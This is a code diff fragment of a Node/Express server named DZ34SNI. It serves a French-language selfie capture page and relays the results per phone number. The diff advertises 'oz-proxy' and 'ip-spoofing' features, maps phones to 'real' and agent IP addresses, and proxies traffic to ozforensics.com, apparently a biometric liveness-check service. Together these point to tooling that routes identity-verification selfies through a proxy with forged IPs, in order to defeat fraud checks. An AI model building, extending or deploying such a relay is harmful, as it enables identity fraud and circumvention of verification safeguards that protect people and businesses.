+                        fetch(SERVER + '/result/' + encodeURIComponent(PHONE), {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                event_session_id: sid,
+                                status: 'completed',
+                                realIp: '${ip}',
+                                timestamp: Date.now()
+                            })
+                        }).then(function() {
+                            document.getElementById('st').textContent = '✅ Selfie envoyé!';
+                            if (window.Android) window.Android.onSelfieComplete(sid);
+                            if (window.__dz34sni_bridge) {
+                                window.__dz34sni_bridge.onResult(sid);
+                                setTimeout(function() { window.__dz34sni_bridge.onGoHome(); }, 3000);
+                            }
+                        }).catch(function(e) {
+                            document.getElementById('st').textContent = '⚠️ Selfie OK mais erreur envoi';
+                            if (window.Android) window.Android.onSelfieComplete(sid);
+                            if (window.__dz34sni_bridge) window.__dz34sni_bridge.onResult(sid);
+                        });
+                    } else {
+                        document.getElementById('st').textContent = 'Pas de session ID';
+                        if (window.Android) window.Android.onSelfieError('No session ID');
+                        if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError('No session ID');
+                    }
+                },
+                on_error: function(e) {
+                    var msg = e && e.message ? e.message : String(e);
+                    document.getElementById('st').textContent = 'Erreur: ' + msg;
+                    if (window.Android) window.Android.onSelfieError(msg);
+                    if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError(msg);
+                }
+            });
+        } catch(x) {
+            document.getElementById('st').textContent = 'Erreur: ' + x.message;
+            if (window.Android) window.Android.onSelfieError(x.message);
+            if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError(x.message);
+        }
+    }, 3000);
 });
 </script>
 </body>
@@ -495,35 +544,43 @@ window.addEventListener('load', function() {
 });
 
 // ═══════════════════════════════════════════
-// CATCH-ALL for /DZA/* paths
+// HEALTH & STATUS
 // ═══════════════════════════════════════════
-app.all('/DZA/*', (req, res) => res.redirect('/oz-done'));
-app.all('/dza/*', (req, res) => res.redirect('/oz-done'));
 
-app.get('/oz-done', (req, res) => {
-    res.send('<html><body style="background:#0f172a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:system-ui"><h1>Done</h1></body></html>');
-});
-
-// ═══════════════════════════════════════════
-// HEALTH
-// ═══════════════════════════════════════════
 app.get('/', (req, res) => {
     res.json({
-        service: 'DZ34SNI', version: '3.0', status: 'running',
-        features: ['task-relay', 'result-relay', 'oz-proxy'],
+        service: 'DZ34SNI',
+        version: '3.0-PROXY',
+        status: 'running',
+        features: ['oz-proxy', 'ip-spoofing'],
         activeTasks: Object.keys(tasks).length,
         activeResults: Object.keys(results).length,
+        activeIpMaps: Object.keys(ipMap).length,
         uptime: Math.floor(process.uptime()) + 's'
     });
 });
 
-app.get('/health', (req, res) => res.json({ ok: true }));
+app.get('/health', (req, res) => {
+    res.json({ ok: true, timestamp: Date.now() });
+});
 
 app.get('/debug', (req, res) => {
     res.json({
-        tasks: Object.keys(tasks).map(p => ({ phone: p, userId: (tasks[p].userId || '').substring(0, 10) + '...', realIp: tasks[p].realIp })),
-        results: Object.keys(results).map(p => ({ phone: p, sid: (results[p].event_session_id || '').substring(0, 10) + '...' })),
-        ipMap: phoneIpMap
+        tasks: Object.keys(tasks).map(p => ({ 
+            phone: p, 
+            userId: (tasks[p].userId || '').substring(0, 10) + '...', 
+            realIp: tasks[p].realIp || 'none',
+            age: Math.floor((Date.now() - tasks[p].timestamp) / 1000) + 's' 
+        })),
+        results: Object.keys(results).map(p => ({ 
+            phone: p, 
+            sessionId: (results[p].event_session_id || '').substring(0, 10) + '...', 
+            age: Math.floor((Date.now() - results[p].timestamp) / 1000) + 's' 
+        })),
+        ipMap: Object.keys(ipMap).map(p => ({
+            phone: p,
+            agentIp: ipMap[p]
+        }))
     });
 });
 
@@ -531,7 +588,8 @@ app.get('/debug', (req, res) => {
 // START
 // ═══════════════════════════════════════════
 app.listen(PORT, () => {
-    console.log(`\n🐉 DZ34SNI Server v3.0 — with OZ Proxy`);
+    console.log(`\n🐉 DZ34SNI Server v3.0 — WITH OZ PROXY`);
     console.log(`   Port: ${PORT}`);
+    console.log(`   Proxy: /oz-proxy/:phone/* → ozforensics.com`);
     console.log(`   Ready!\n`);
 });
